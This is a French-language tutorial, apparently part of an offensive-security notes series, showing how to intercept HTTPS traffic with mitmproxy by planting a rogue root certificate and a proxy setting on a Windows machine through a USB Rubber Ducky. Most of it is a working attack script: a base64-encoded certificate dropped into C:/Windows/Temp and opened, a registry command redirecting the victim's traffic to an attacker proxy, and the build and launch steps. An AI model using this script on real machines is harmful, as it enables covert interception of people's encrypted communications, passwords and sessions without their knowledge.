

---

## SSL mitm

Les connections en http (port 80) ne sont pas crypter, il est donc facile de le sniffer..
En revanche les connection en https (port 443, avec le petit cadenas) sont crypté avec ssl (Secure Socket Layer) qui utilise rsa (encryption asymetrique, comme pour notre petit ransomeware)

Dans cet exemple on va inserer un certificat dans le trust root ca store.
On va egalement canger les network settings afin d'ajoutter un proxy pr que le traffic passe par notre mitmproxy server

---

#### Setup

On encoder le certificat publique du mitmproxy (celui au format p12) en base64 (celui de windows) avec:

```
powershell> $b64str = [Convert]::ToBase64String([IO.File]::ReadAllBytes($certificatPath))
```

On cree un fichier txt pour le rubberducky:

```
STRING [IO.File]::WriteAllBytes('C:/Windows/Temp/cert.p12', [Convert]::FromBase64String("MIIEcAIBAzCCBDoGCSqGSIb3DQEHAaCCBCsEggQnMIIEIzCCBB8GCSqGSIb3DQEHBqCCBBAwggQMAgEAMIIEBQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQIKn7/Eg6FTsMCAggAgIID2Jb5bLWzZkMoSQu7/X+KOo03XiM4XoFZn3qX7ezbW88mnXE8DNZmp58NYNL8QtF3htkTluzAG+k9YXkzuygt1FcpaJIq/iNO0KpNvZURoQhvF93IbIyPT50pYS0hpXep9prbyxQdzoLgAncPAsjU/ExS+1xrVuy3Jx1LY3npa+0svCJO9QQC3EDrSzb6xbNvk9hF5SGhhecACuQPmbTj6zjbXVq7hmaj7sneMXihPId5R/QOcF+ctIqMUM6HpMtbTrIjhALPkVjyaLx0fL+JJi3fIUCqoTCY1NRPlWH5DJAwc3Z0efd3ij8/UzuoJqdB3mL3ketmTETQyRq24P+p4P1LHIPe+jAuozHUkVRRCKcS0OEhF9XH9BPw1iSK0Iqq7pNiUdkLH7402ypjTo3L/FXFqeu/MgPvYOtHyixqyB8gDQ+5xTzYzKTAB76v5PkG61ix0IunSFffvtfy0DEuAbv2jUt6wxrYfx1mNsUzUpQAVWLB97d3IPNQDGcYxiKf2UeLGF3IY5mF2qkain4I/bHY0Jj/iDmuy7Gtpx78MbjeQ+vEEdotj9HNVgWaM/Filyf5yvsZKJN1FVTfAbqqGgV4QoT/7wjZjyYWQHqkwNXnls2ZaefHqRBW64OBHMCd9T8WR/9JU06cEhXZfjnQlQIdeZXWsQSFIVaZavAkxavqYD3zdRWA97qRtGo6rnWQUm0b6o11t/dBzsxqqcHhiJ+SpTokRSLtuG9S1Wa040dBUWr3WucBhwTotzWVihDuhZfxUu7MOJtVZnSJpHKEE/MkvNPjVv9TdG0y/ntLaYLhOcl2eKo+OpEfxZm+vDPwj+c6HDh7+3sUsb6nIiE5pUj6udOMYgnq/RA8vYClGvL0o2XsW+KOasoqvr4/e1GihurcRvubusXE/IftH5XvmBHlPSm8R3tupSp02+RZTV7ct+Rw5AM/XVLwXuj4vTAxOXCL/KvdS/HbzeE7L8pxGBhLdeluNV6MpXGdog/Rs8MmAemAxeuMXH+xbux6lgPTLJI8Rm27poQVSPTxN8oQu742CuDkym3lCneS5XR8Zmd0Dnt4OwXVsjc5HykLEFUXutsNUv1BzKXjGknv5FRpIEZ5pIlmf8Nk+Q3urfk/o7Sxug297KTHb61ZgzpiwgCT/R7QV0ZOghNwk/ZnMil5eDY+mHNhBI988wancioLIeC+lK579WUTmTGpO4z10K4A++n8nLSI/P2LG/LoaI+jdLDl3AkKGvu1tqE15FeIe2xLCBYWAVjdq+QwfmaRThHpItcuK01B5DMX2nB66bCy8t2e93i2bRPlhzAtMCEwCQYFKw4DAhoFAAQUUj8Qkw1qHfkW3K+fjyn2nPnhUrMECJdQ7sNKJQNK"))

DELAY 800
ENTER
STRING Start-Process "C:/Windows/Temp/cert.p12"
```

Pour ajouter l'addr et le port du server proxy et l'active:

```
STRING $reg = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"; Set-ItemProperty -Path $reg -Name ProxyServer -Value "192.168.1.19:8080";Set-ItemProperty -Path $reg -Name ProxyEnable -Value 1
DELAY 300
ENTER
```

On compilez le script avec `java -jar -i mitm.txt -o inject.bin -l fr` et inserez le das le ducky rubber


---

#### L'attaque

On lance le mitmproxy avec

```
mitmproxy
```

On plug la clée usb et apres 20 seconde, voila le resultat

![img](assets/mitm.png)

Les communications se font toujours en https, mais nous sommes maintenant capable de les voire en claires  :)

